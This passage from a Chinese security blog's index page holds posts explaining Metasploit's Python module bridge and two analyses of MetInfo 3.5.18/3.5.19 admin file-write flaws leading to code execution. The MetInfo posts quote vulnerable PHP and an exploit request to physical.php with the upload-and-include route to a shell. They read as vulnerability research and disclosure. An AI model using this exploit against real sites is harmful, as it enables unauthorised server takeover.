class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">require &apos;msf/core/modules/external/bridge&apos;</span><br><span class="line"></span><br><span class="line">class Msf::Modules::External::Shim</span><br><span class="line">  # 将bridge返回的数据生成一个模块</span><br><span class="line">  def self.generate(module_path)</span><br><span class="line">    mod = Msf::Modules::External::Bridge.open(module_path)</span><br><span class="line">    return &apos;&apos; unless mod.meta</span><br><span class="line">    # 这里根据模块元数据来选择模板 目前只有3个 元数据获取查看bridge.rb的meta方法 </span><br><span class="line">    case mod.meta[&apos;type&apos;]</span><br><span class="line">    when &apos;remote_exploit_cmd_stager&apos;</span><br><span class="line">      remote_exploit_cmd_stager(mod)</span><br><span class="line">    when &apos;capture_server&apos;</span><br><span class="line">      capture_server(mod)</span><br><span class="line">    when &apos;dos&apos;</span><br><span class="line">      dos(mod)</span><br><span class="line">    when &apos;scanner.multi&apos;</span><br><span class="line">      multi_scanner(mod)</span><br><span class="line">    else</span><br><span class="line">      # TODO have a nice load error show up in the logs</span><br><span class="line">      &apos;&apos;</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line">  </span><br><span class="line">  # 返回一个模块 erb是ruby的一个代码模板库</span><br><span class="line">  def self.render_template(name, meta = &#123;&#125;)</span><br><span class="line">    template = File.join(File.dirname(__FILE__), &apos;templates&apos;, name)</span><br><span class="line">    ERB.new(File.read(template)).result(binding)</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def self.common_metadata(meta = &#123;&#125;)</span><br><span class="line">    render_template(&apos;common_metadata.erb&apos;, meta)</span><br><span class="line">  end</span><br><span class="line">  </span><br><span class="line">  # 数据转换</span><br><span class="line">  def self.mod_meta_common(mod, meta = &#123;&#125;)</span><br><span class="line">    meta[:path]        = mod.path.dump</span><br><span class="line">    meta[:name]        = mod.meta[&apos;name&apos;].dump</span><br><span class="line">    meta[:description] = mod.meta[&apos;description&apos;].dump</span><br><span class="line">    meta[:authors]     = mod.meta[&apos;authors&apos;].map(&amp;:dump).join(&quot;,\n          &quot;)</span><br><span class="line"></span><br><span class="line">    meta[:options]     = mod.meta[&apos;options&apos;].map do |n, o|</span><br><span class="line">      &quot;Opt#&#123;o[&apos;type&apos;].camelize&#125;.new(#&#123;n.dump&#125;,</span><br><span class="line">        [#&#123;o[&apos;required&apos;]&#125;, #&#123;o[&apos;description&apos;].dump&#125;, #&#123;o[&apos;default&apos;].inspect&#125;])&quot;</span><br><span class="line">    end.join(&quot;,\n          &quot;)</span><br><span class="line">    meta</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line"> # 渲染膜拜</span><br><span class="line">  def self.dos(mod)</span><br><span class="line">    meta = mod_meta_common(mod)</span><br><span class="line">    meta[:date] = mod.meta[&apos;date&apos;].dump</span><br><span class="line">    meta[:references] = mod.meta[&apos;references&apos;].map do |r|</span><br><span class="line">      &quot;[#&#123;r[&apos;type&apos;].upcase.dump&#125;, #&#123;r[&apos;ref&apos;].dump&#125;]&quot;</span><br><span class="line">    end.join(&quot;,\n          &quot;)</span><br><span class="line">    render_template(&apos;dos.erb&apos;, meta)</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure></p>
<p>所以python模块的运行过程其实是这样的</p>
<ol>
<li>class Msf::Modules::External::Shim获取到了模块路径</li>
<li>调用Msf::Modules::External::Bridge.open</li>
<li>在open方法 Msf::Modules::External::PyBridge::applies判断成功(也就是确认了是python模块)</li>
<li>初始化一个Msf::Modules::External::PyBridge并返回</li>
<li>判断元数据类型 假设是dos 则调用dos方法</li>
<li>调用mod_meta_common方法转换元数据 渲染代码模板</li>
</ol>
<p>我们可以查看<code>dos.erb</code>的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">require &apos;msf/core/modules/external/bridge&apos;</span><br><span class="line">require &apos;msf/core/module/external&apos;</span><br><span class="line"></span><br><span class="line">class MetasploitModule &lt; Msf::Auxiliary</span><br><span class="line">  include Msf::Module::External</span><br><span class="line">  include Msf::Auxiliary::Dos</span><br><span class="line"></span><br><span class="line">  def initialize</span><br><span class="line">    super(&#123;</span><br><span class="line">	  &lt;%= common_metadata meta %&gt;</span><br><span class="line">      &apos;References&apos;  =&gt;</span><br><span class="line">        [</span><br><span class="line">          &lt;%= meta[:references] %&gt;</span><br><span class="line">        ],</span><br><span class="line">      &apos;DisclosureDate&apos; =&gt; &lt;%= meta[:date] %&gt;,</span><br><span class="line">      &#125;)</span><br><span class="line"></span><br><span class="line">      register_options([</span><br><span class="line">        &lt;%= meta[:options] %&gt;</span><br><span class="line">      ])</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  def run</span><br><span class="line">    print_status(&quot;Starting server...&quot;)</span><br><span class="line">    mod = Msf::Modules::External::Bridge.open(&lt;%= meta[:path] %&gt;)</span><br><span class="line">    mod.run(datastore)</span><br><span class="line">    wait_status(mod)</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure></p>
<p>所以事实上python模块的实现就是将python代码中元数据传递到代码模板 然后实际上调用的还是ruby模板 我们的python文件路径将会出现在<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mod = Msf::Modules::External::Bridge.open(&lt;%= meta[:path] %&gt;)</span><br><span class="line">mod.run(datastore)</span><br></pre></td></tr></table></figure></p>
<p>最后通过<code>bridge.run</code>调用.这种扩展方法不但没有失去对ruby模块的强大支持也没丢失python的灵活性 非常好</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blue-bird1.github.io/2018/02/05/metasploit-python-模块是如何运行/" data-id="cji113tpw0000r0nx5ofancvs" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/编程技术/">编程技术</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-metasploit-python-模块" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/02/02/metasploit-python-模块/" class="article-date">
  <time class="post-time" datetime="2018-02-02T01:31:50.000Z" itemprop="datePublished">
    <span class="post-month">2月</span><br/>
    <span class="post-day">02</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/02/02/metasploit-python-模块/">metasploit python 模块</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>metasploit在2017年尾将python作为官方支持语言,并且已经有python模块加入主分支.这使得我们开发metasploit模块可以不去学习ruby</p>
<h3 id="为什么将python作为官方支持语言"><a href="#为什么将python作为官方支持语言" class="headerlink" title="为什么将python作为官方支持语言"></a>为什么将python作为官方支持语言</h3><ol>
<li>很多不是metasploit官方人员编程的模块都是使用python编写</li>
<li>现在python流行程度非常高 很多渗透人员python熟练程度比ruby高</li>
</ol>
<h3 id="metasploit的python模块是什么"><a href="#metasploit的python模块是什么" class="headerlink" title="metasploit的python模块是什么"></a>metasploit的python模块是什么</h3><p>主分支的一个python模块 <a href="https://github.com/rapid7/metasploit-framework/blob/778e69f92912c555e72bc3318278443126704b75/modules/auxiliary/dos/http/slowloris.py" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/blob/778e69f92912c555e72bc3318278443126704b75/modules/auxiliary/dos/http/slowloris.py</a></p>
<p>python模块实际是通过json-rpc调用与metasploit通信</p>
<p>metasploit获取元数据如图(来自官方博客)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+------------+</span><br><span class="line">| Metasploit |</span><br><span class="line">|            |  Describe yourself  +-------------------+</span><br><span class="line">|            +-------------------&gt; |  some_module.py   |</span><br><span class="line">|            |                     |                   |</span><br><span class="line">|            |                     |                   |</span><br><span class="line">|            |   Some metadata     |                   |</span><br><span class="line">|            | &lt;-------------------+                   |</span><br><span class="line">|            |                     |                   |</span><br><span class="line">|            |                     +-------------------+</span><br><span class="line">|            |</span><br><span class="line">|            |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure></p>
<p>模块调用如图<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">+------------+</span><br><span class="line">| Metasploit |  Do a thing with</span><br><span class="line">|            |   these options     +-------------------+</span><br><span class="line">|            +-------------------&gt; |  some_module.py   |</span><br><span class="line">|            |                     |                   |</span><br><span class="line">|            |                     |                   |</span><br><span class="line">|            |   A bit of status   |                   |</span><br><span class="line">|            | &lt;-------------------+                   |</span><br><span class="line">|            |                     |                   |</span><br><span class="line">|            |  Moar status        |                   |</span><br><span class="line">|            | &lt;-------------------+                   |</span><br><span class="line">|            |                     |                   |</span><br><span class="line">|            |  I found a thing    |                   |</span><br><span class="line">|            | &lt;-------------------+                   |</span><br><span class="line">|            |                     |                   |</span><br><span class="line">|            |                     +-------------------+</span><br><span class="line">|            |</span><br><span class="line">+------------+</span><br></pre></td></tr></table></figure></p>
<h3 id="将会发生什么"><a href="#将会发生什么" class="headerlink" title="将会发生什么"></a>将会发生什么</h3><p>实际上对于原来的开发方式没有影响,完全可以使用原来的ruby编写方式.但是对于不熟悉ruby的开发者可以使用python来方便的编写模块</p>
<h3 id="python在metasploit能做什么"><a href="#python在metasploit能做什么" class="headerlink" title="python在metasploit能做什么"></a>python在metasploit能做什么</h3><p>可以使用的和ruby模块并没有区别</p>
<h2 id="如何编写一个python模块"><a href="#如何编写一个python模块" class="headerlink" title="如何编写一个python模块"></a>如何编写一个python模块</h2><p>首先需要导入需要的模块<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># another:bluebird</span><br><span class="line">from metasploit import module</span><br></pre></td></tr></table></figure></p>
<p>这个metasploit实际上路径是 <code>lib/msf/core/modules/external/python/</code></p>
<p>然后定义元数据 格式和ruby模块的一样.详细可参考<a href="https://www.kancloud.cn/bluebird/metasploit/486941" target="_blank" rel="noopener">这里的文档</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">metadata = &#123;</span><br><span class="line">	# 模块名字</span><br><span class="line">    &apos;name&apos;: &apos;metasploit python module demo &apos;,</span><br><span class="line">    # 模块的描述</span><br><span class="line">    &apos;description&apos;: &apos;&apos;&apos;</span><br><span class="line">        send a http request metasploit python module demo</span><br><span class="line">     &apos;&apos;&apos;,</span><br><span class="line">     # 模块作者</span><br><span class="line">    &apos;authors&apos;: [</span><br><span class="line">        &apos;bluebird&apos;, </span><br><span class="line">    ],</span><br><span class="line">    # 编写时间</span><br><span class="line">    &apos;date&apos;: &apos;2018-02-02&apos;,</span><br><span class="line">    # 漏洞参考</span><br><span class="line">    &apos;references&apos;: [</span><br><span class="line">       </span><br><span class="line">     ],</span><br><span class="line">     # 漏洞类型 只能在已有的类型选项 </span><br><span class="line">    &apos;type&apos;: &apos;dos&apos;,</span><br><span class="line">    # 模块选项</span><br><span class="line">    &apos;options&apos;: &#123;</span><br><span class="line">        &apos;rhost&apos;: &#123;&apos;type&apos;: &apos;address&apos;, &apos;description&apos;: &apos;The target address&apos;, &apos;required&apos;: True, &apos;default&apos;: None&#125;,</span><br><span class="line">        &apos;rport&apos;: &#123;&apos;type&apos;: &apos;port&apos;, &apos;description&apos;: &apos;The target port&apos;, &apos;required&apos;: True, &apos;default&apos;: 80&#125;,</span><br><span class="line">     &#125;&#125;</span><br></pre></td></tr></table></figure>
<p>然后一般应该定义一个<code>run</code>方法.这个demo输出了helloworld<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def run(args):</span><br><span class="line">    module.log(&apos;helloworld&apos;)</span><br></pre></td></tr></table></figure></p>
<p>最后定义主方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    module.run(metadata, run)</span><br></pre></td></tr></table></figure></p>
<p>让我们实际跑一下(注意请给你的python文件添加执行权限)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 auxiliary(test/demo) &gt; set rhost 127.0.0.1</span><br><span class="line">rhost =&gt; 127.0.0.1</span><br><span class="line">msf5 auxiliary(test/demo) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Starting server...</span><br><span class="line">[*] hello world</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf5 auxiliary(test/demo) &gt;</span><br></pre></td></tr></table></figure></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blue-bird1.github.io/2018/02/02/metasploit-python-模块/" data-id="cji113tqr0003r0nxhr86e87r" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/编程技术/">编程技术</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-metinfo3-5-19后台getshell分析" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/11/28/metinfo3-5-19后台getshell分析/" class="article-date">
  <time class="post-time" datetime="2017-11-28T01:29:34.000Z" itemprop="datePublished">
    <span class="post-month">11月</span><br/>
    <span class="post-day">28</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/11/28/metinfo3-5-19后台getshell分析/">metinfo3.5.19后台getshell分析</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="metinfo后台getshellexp分析"><a href="#metinfo后台getshellexp分析" class="headerlink" title="metinfo后台getshellexp分析"></a>metinfo后台getshellexp分析</h3><p>漏洞版本<code>3.5.19</code>  漏洞文件路径<code>/admin/app/physical/physical.php</code><br>有趣的是<code>3.5.18</code>修复的后台getshell也是这个文件<br><code>3.5.18</code>漏洞分析 <a href="https://bbs.ichunqiu.com/thread-29582-1-1.html" target="_blank" rel="noopener">点我</a><br>上次分析完后顺手审计一下那个文件，发现居然还有一个getshell漏洞。提交后没人理就发出来分享</p>
<h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">elseif($action==&quot;op&quot;)&#123;</span><br><span class="line">	// 不相关代码</span><br><span class="line">	$val=explode(&apos;|&apos;,$valphy);</span><br><span class="line">    // 不相关代码</span><br><span class="line">	switch($op)&#123;</span><br><span class="line">	   // 不相关代码</span><br><span class="line">		case 3:</span><br><span class="line">			$fileaddr=explode(&apos;/&apos;,$val[1]);</span><br><span class="line">			$filedir=&quot;../../../&quot;.$fileaddr[0];  </span><br><span class="line">			if(!file_exists($filedir))&#123; @mkdir ($filedir, 0777); &#125; </span><br><span class="line">			if($fileaddr[1]==&quot;index.php&quot;)&#123;</span><br><span class="line">				if($val[2])&#123;</span><br><span class="line">					Copyindx(&quot;../../../&quot;.$val[1],$val[2]);</span><br><span class="line">				&#125;</span><br></pre></td></tr></table></figure>
<p>需要<code>op</code>参数为3才能进入漏洞代码流程，并且要正常执行，需要<code>fileaddr[1]=&#39;index.php&#39;</code>和<code>$val[2]</code>也就是valphy参数要为<code>xxx|xxx/index.php|xxx</code>格式</p>
<p>查看<code>Copyindex</code>函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function Copyindx($newindx,$type)&#123;</span><br><span class="line">    if(!file_exists($newindx))&#123;</span><br><span class="line">        if($type==3)&#123;</span><br><span class="line">            //生成产品栏目index</span><br><span class="line">            $oldcont =&quot;&lt;?php\n# MetInfo Enterprise Content Management System \n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \n\$filpy = basename(dirname(__FILE__));\n\$fmodule=$type;\n\$cmodule=&apos;product_index&apos;;\nrequire_once &apos;../include/module.php&apos;; \nrequire_once \$module; \n# This program is an open source system, commercial use, please consciously to purchase commercial license.\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\n?&gt;&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $oldcont =&quot;&lt;?php\n# MetInfo Enterprise Content Management System \n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \n\$filpy = basename(dirname(__FILE__));\n\$fmodule=$type;\nrequire_once &apos;../include/module.php&apos;; \nrequire_once \$module; \n# This program is an open source system, commercial use, please consciously to purchase commercial license.\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\n?&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        $fp = fopen($newindx,w);</span><br><span class="line">        fputs($fp, $oldcont);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到如果传入type参数不等于3,进入第二个流程.发现是单纯的字符串拼接,然后这个函数的参数我们都可控</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blue-bird1.github.io/2017/11/28/metinfo3-5-19后台getshell分析/" data-id="cji113tqu0004r0nx4l5c5mh1" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全-漏洞分析/">web安全    漏洞分析</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-metinfoexp" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/11/25/metinfoexp/" class="article-date">
  <time class="post-time" datetime="2017-11-25T01:27:13.000Z" itemprop="datePublished">
    <span class="post-month">11月</span><br/>
    <span class="post-day">25</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/11/25/metinfoexp/">metinfo3.5.18后台getshell分析</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>此漏洞已经在最新版修复</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p> <code>/admin/app/physical/physical.php?action=op&amp;op=3&amp;valphy=test|文件名&amp;address=包含文件</code></p>
<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>查看关键代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			$fileaddr=explode(<span class="string">'/'</span>,$val[<span class="number">1</span>]);</span><br><span class="line">			$filedir=<span class="string">"../../../"</span>.$fileaddr[<span class="number">0</span>];  </span><br><span class="line">			<span class="keyword">if</span>(!file_exists($filedir))&#123; @mkdir ($filedir, <span class="number">0777</span>); &#125; </span><br><span class="line">			<span class="keyword">if</span>($fileaddr[<span class="number">1</span>]==<span class="string">"index.php"</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span>($val[<span class="number">2</span>])&#123;</span><br><span class="line">					Copyindx(<span class="string">"../../../"</span>.$val[<span class="number">1</span>],$val[<span class="number">2</span>]);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="comment">// 漏洞点</span></span><br><span class="line">			<span class="keyword">switch</span>($val[<span class="number">2</span>])&#123;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">					$address=<span class="string">"../about/$fileaddr[1]"</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">					$address=<span class="string">"../news/$fileaddr[1]"</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">					$address=<span class="string">"../product/$fileaddr[1]"</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">					$address=<span class="string">"../download/$fileaddr[1]"</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">					$address=<span class="string">"../img/$fileaddr[1]"</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">					$address=<span class="string">"../feedback/$fileaddr[1]"</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			</span><br><span class="line"></span><br><span class="line">			&#125;   </span><br><span class="line">				$newfile  =<span class="string">"../../../$val[1]"</span>; </span><br><span class="line">				</span><br><span class="line">				Copyfile($address,$newfile);</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">echo</span> $lang_physicalgenok;</span><br><span class="line">			<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p>
<p>我们可以看到我们可控参数<code>$address</code>和<code>newfile</code>传入了<code>Copyfile</code><br>主要是程序员写代码的时候忽略了异常参数导致address参数没有被覆盖,应该添加不是正常参数时不执行<code>Copyfile</code></p>
<p>查看<code>Copyfile</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Copyfile</span><span class="params">($address,$newfile)</span></span>&#123;</span><br><span class="line">	$oldcont  = <span class="string">"&lt;?php\n# MetInfo Enterprise Content Management System \n# Copyright (C) MetInfo Co.,Ltd (http://www.metinfo.cn). All rights reserved. \nrequire_once '$address';\n# This program is an open source system, commercial use, please consciously to purchase commercial license.\n# Copyright (C) MetInfo Co., Ltd. (http://www.metinfo.cn). All rights reserved.\n?&gt;"</span>;</span><br><span class="line">	<span class="keyword">if</span>(!file_exists($newfile))&#123;</span><br><span class="line">		$fp = fopen($newfile,w);</span><br><span class="line">		fputs($fp, $oldcont);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>此函数可以创建并写入文件<br>可以看到此函数我们可以控制文件名,不过单引号导致我们只能控制require_once参数.<br>不过也造成了文件包含漏洞,上传一个php代码头像,即可getshell</p>
<p>查看最新版本修复方法<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">default</span>:</span><br><span class="line">	 $address = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure></p>
<p>添加了不是正常参数时候默认为空</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blue-bird1.github.io/2017/11/25/metinfoexp/" data-id="cji113tr90008r0nxzkaam589" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全-漏洞分析/">web安全     漏洞分析</a></li></ul>

    </footer>
  </div>
  
</article>




  

</section>
        
          <aside id="sidebar">
  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <h1 class="blog-title">青鸟 Blog</h1>
    <h2 class="blog-subtitle">青鸟的Blog</h2>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>主页</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>归档</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分类</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>标签</li>
          </a>
        
    </ul>
  </div>
</div>

  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="https://avatars3.githubusercontent.com/u/31133259?s=460&amp;v=4">
    <h2 class="author">bluebird</h2>
    <h3 class="description"></h3>
    <div class="count-box">
      <a href="/archives"><div><strong>7</strong><br>文章</div></a>
      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
      <a href="/tags"><div><strong>4</strong><br>标签</div></a>
    </div>



    <div class="social-link">
      
        <a class="hvr-bounce-in" href="http://github.com/blue-bird1" target="_blank" title="Github">
          Github
        </a>
      
    </div>

    <div class="friend-link">
      <h2>友情链接</h2>
      
        <a class="hvr-bounce-in" href="https://jiaqiangbandongg.github.io/" target="_blank" title="李孟禹的日常">
          李孟禹的日常
        </a>
      
        <a class="hvr-bounce-in" href="https://zehuichen123.github.io/" target="_blank" title="loveSnowBest&#39;Blog">
          loveSnowBest&#39;Blog
        </a>
      
        <a class="hvr-bounce-in" href="http://yaoyaomeng.github.io" target="_blank" title="xyz&#39;blog">
          xyz&#39;blog
        </a>
      
    </div>
  </div>
</div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy;2017 - 2018 bluebird<br>
      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
      主题-<a href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
      
    </div>
    
  </div>
</footer>
    </div>
    

<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
<script>
new WOW().init();
</script>   


  <link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
  <script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>



  <link rel="stylesheet" href="/plugin/galmenu/GalMenu.css">
  <script src="/plugin/galmenu/GalMenu.js"></script>
  <div class="GalMenu GalDropDown">
      <div class="circle" id="gal">
        <div class="ring">
          
            <a href="/" title="" class="menuItem">首页</a>
          
            <a href="/archives" title="" class="menuItem">归档</a>
          
